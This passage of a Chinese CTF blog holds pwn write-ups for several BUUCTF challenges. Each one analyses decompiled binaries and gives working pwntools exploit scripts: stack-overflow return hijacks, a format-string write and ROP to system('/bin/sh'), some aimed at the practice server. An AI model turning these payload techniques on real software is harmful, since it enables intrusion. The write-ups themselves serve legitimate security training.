                     data-src="/images/BUUCTF/buuctf-rip.png"
                      alt="buuctf-rip"
                ><br>无壳，C语言编写，64位ELF文件。<br>检查保护：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-rip_1.png"
                      alt="buuctf-rip_1"
                ><br>保护全关。<br>IDA Pro加载：<br>主函数中有很明显的栈溢出：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets((__int64)s, (__int64)argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>并且存在后门函数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">401186</span> fun             proc near</span><br><span class="line">.text:<span class="number">401186</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">401186</span>                 push    rbp</span><br><span class="line">.text:<span class="number">401187</span>                 mov     rbp, rsp</span><br><span class="line">.text:40118A                 lea     rdi, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">401191</span>                 call    _system</span><br><span class="line">.text:<span class="number">401196</span>                 nop</span><br><span class="line">.text:<span class="number">401197</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">401198</span>                 retn</span><br><span class="line">.text:<span class="number">401198</span> ; &#125; <span class="comment">// starts at 401186</span></span><br><span class="line">.text:<span class="number">401198</span> fun             endp</span><br></pre></td></tr></table></figure></div>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>溢出到rbp，后面接上后门函数地址即可getshell。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./rip&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29379</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401187</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-rip_2.png"
                      alt="buuctf-rip_2"
                ></p>
<h2 id="buuctf-warmup-csaw-2016"><a href="#buuctf-warmup-csaw-2016" class="headerlink" title="buuctf-warmup_csaw_2016"></a>buuctf-warmup_csaw_2016</h2><h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-warmup_csaw_2016.png"
                      alt="buuctf-warmup_csaw_2016"
                ><br>无壳，C语言编写。<br>检查保护：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-warmup_csaw_2016_1.png"
                      alt="buuctf-warmup_csaw_2016_1"
                ><br>没开保护。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-/images/n&quot;</span>, <span class="number">0xAu</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p/images/n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>程序逻辑比较简单，输出了后门函数地址，然后接收字符串。</p>
<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>程序接收字符串的时候没有大小检查，导致可以溢出，我们利用溢出将程序劫持到后门即可。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25078</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;WOW:0x&quot;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment"># print(&quot;backdoor:&quot;, hex(backdoor))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">72</span> + p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;flag&#x27;)</span></span><br><span class="line">flag = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(flag))</span><br><span class="line"></span><br><span class="line">start = flag.find(<span class="string">b&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">end = flag.find(<span class="string">b&#x27;&#125;&#x27;</span>, start)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> start != -<span class="number">1</span> <span class="keyword">and</span> end != -<span class="number">1</span>:</span><br><span class="line">    flag = flag[start:end+<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-warmup_csaw_2016_2.png"
                      alt="buuctf-warmup_csaw_2016_2"
                ></p>
<h2 id="buuctf-ciscn-2019-n-1"><a href="#buuctf-ciscn-2019-n-1" class="headerlink" title="buuctf-ciscn_2019_n_1"></a>buuctf-ciscn_2019_n_1</h2><h3 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h3><p>DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-ciscn_2019_n_1.png"
                      alt="buuctf-ciscn_2019_n_1"
                ><br>无壳，64位ELF文件，C语言编写。<br>检查保护：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-ciscn_2019_n_1_1.png"
                      alt="buuctf-ciscn_2019_n_1_1"
                ><br>只开了NX。<br>IDA Pro加载文件：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里可以看到要我们输入到<code>v1</code>，通过覆盖到<code>v2</code>，将<code>v2</code>覆盖为11.28125即可<code>cat flag</code>。</p>
<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>这道题有两种利用思路：第一种就是利用v1，溢出到v2，使其满足条件，cat flag，第二种是：利用v1，溢出到ebp + 4，劫持程序流程，直接执行cat flag</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><p>经过调试，v2地址：<code>0x400682 &lt;func+12&gt;    movss  dword ptr [rbp - 4], xmm0</code>，v1地址：<code>0x400691 &lt;func+27&gt;    lea    rax, [rbp - 0x30]</code>，也就是说，我们向v1输入0x30 - 4即可覆盖到v2。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25198</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x30</span> - <span class="number">4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(<span class="number">0x41348000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">flag = io.recvall()</span><br><span class="line">start = flag.find(<span class="string">b&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">end = flag.find(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> start != -<span class="number">1</span> <span class="keyword">and</span> end != -<span class="number">1</span>:</span><br><span class="line">    flag = flag[start:end + <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-ciscn_2019_n_1_4.png"
                      alt="buuctf-ciscn_2019_n_1_4"
                ><br>第二种：我们直接溢出到ebp+4，后门地址：<code>text:00000000004006BE                 mov     edi, offset command ; &quot;cat /flag&quot;</code>即可<code>cat flag</code>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25198</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(<span class="number">0x4006BE</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">flag = io.recvall()</span><br><span class="line">start = flag.find(<span class="string">b&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">end = flag.find(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> start != -<span class="number">1</span> <span class="keyword">and</span> end != -<span class="number">1</span>:</span><br><span class="line">    flag = flag[start:end + <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-ciscn_2019_n_1_3.png"
                      alt="buuctf-ciscn_2019_n_1_3"
                ></p>
<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><h3 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a>分析：</h3><p>首先，查看程序静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/pwn1_sctf_2016-file.png"
                      alt="pwn1_sctf_2016-file"
                ><br>可以看到是一个32位ELF文件，运行架构位Intel 80386，动态连接程序。<br>使用IDA Pro加载程序：主要的逻辑在vuln函数中：</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s/images/n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到该程序逻辑为：首先输入32字节字符串，然后，将I换成了you，那么就导致了溢出。<br>该程序还存在后门函数：</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>利用思路：<br>我们需要分析，s距离ebp多少字节，我们最多输入32个字节，如果不够的话，就要使用I转化为you来造成溢出，最终劫持返回地址也就是<code>ebp+4</code>的位置，劫持到后门函数即可cat flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/pwn1_sctf_2016-gdb.png"
                      alt="pwn1_sctf_2016-gdb"
                ><br>可以计算出我们需要<code>64</code>个字节，但是我们只能输入32个字节，那么我们就要想办法构造到64个字节</p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.buuoj.cn&#x27;,29635)</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">21</span> + <span class="string">b&#x27;a&#x27;</span> + p32(<span class="number">0x08048F13</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">flag = io.recvall()</span><br><span class="line">start = flag.find(<span class="string">b&quot;flag&#123;&quot;</span>)</span><br><span class="line">end = flag.find(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">flag = flag[start:end+<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<p>flag：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/pwn1_sctf_2016-flag.png"
                      alt="pwn1_sctf_2016-flag"
                ></p>
<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><h3 id="分析：-4"><a href="#分析：-4" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/jarvisoj_level0-file.png"
                      alt="jarvisoj_level0-file"
                ><br>64位ELF程序，x86_64架构，动态链接，开了NX保护。<br>IDA Pro加载：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/jarvisoj_level0_1.png"
                      alt="jarvisoj_level0_1"
                ><br>很明显栈溢出，而且有后门函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/jarvisoj_level0_2.png"
                      alt="jarvisoj_level0_2"
                ><br>调试看看距离rbp的距离：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/jarvisoj_level0_3.png"
                      alt="jarvisoj_level0_3"
                ><br>找一个ret地址：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/jarvisoj_level0_4.png"
                      alt="jarvisoj_level0_4"
                ></p>
<h3 id="利用思路：-3"><a href="#利用思路：-3" class="headerlink" title="利用思路："></a>利用思路：</h3><p>利用栈溢出ROP到后门函数即可</p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./level0&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26465</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40059A</span></span><br><span class="line">backdoor = <span class="number">0x40059A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x80</span> + p64(ret) + p64(backdoor)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/jarvisoj_level0_5.png"
                      alt="jarvisoj_level0_5"
                ></p>
<h2 id="第五空间2019-决赛PWN5"><a href="#第五空间2019-决赛PWN5" class="headerlink" title="第五空间2019 决赛PWN5"></a>第五空间2019 决赛PWN5</h2><h3 id="分析：-5"><a href="#分析：-5" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/PWN5.png"
                      alt="PWN5"
                ><br>32位ELF应用程序，动态链接，开启了Canary和NX。<br>IDA Pro加载，main函数逻辑较为简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xFu</span>);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14u</span>) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>只要我们输入的和dword_804C044一样即可get Shell，但是这个dword_804C044是哪来的呢？注意到有这样一句代码：<code>printf(buf)</code>，我们可以利用格式化字符串漏洞去修改。</p>
<h3 id="利用思路：-4"><a href="#利用思路：-4" class="headerlink" title="利用思路："></a>利用思路：</h3><p>利用第一次输入，修改dword_804C044，第二次输入保证两个一样即可get Shell。<br>可以看到我们输入的字符串保存在：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/pwn5_1.png"
                      alt="pwn5_1"
                ></p>
<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dword_addr = <span class="number">0x804C044</span></span><br><span class="line"></span><br><span class="line">payload = p32(dword_addr) + p32(dword_addr+<span class="number">1</span>) + p32(dword_addr+<span class="number">2</span>) + p32(dword_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;wd:&quot;</span>)</span><br><span class="line">io.send(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/pwn5_2.png"
                      alt="pwn5_2"
                ></p>
<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>这题有system函数，有<code>/bin/sh</code>字符串，就不写详细分析了，栈溢出直接ROP就行：</p>
<h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x0804A024</span></span><br><span class="line">sys_addr = <span class="number">0x0804845C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(sys_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Input:/images/n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><h3 id="分析：-6"><a href="#分析：-6" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/ciscn_2019_n_8_file.png"
                      alt="ciscn_2019_n_8_file"
                ><br>32位ELF可执行文件，动态链接，开启了Canary，NX，PIE保护。<br>IDA Pro加载，main函数逻辑较为简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf((<span class="type">int</span>)<span 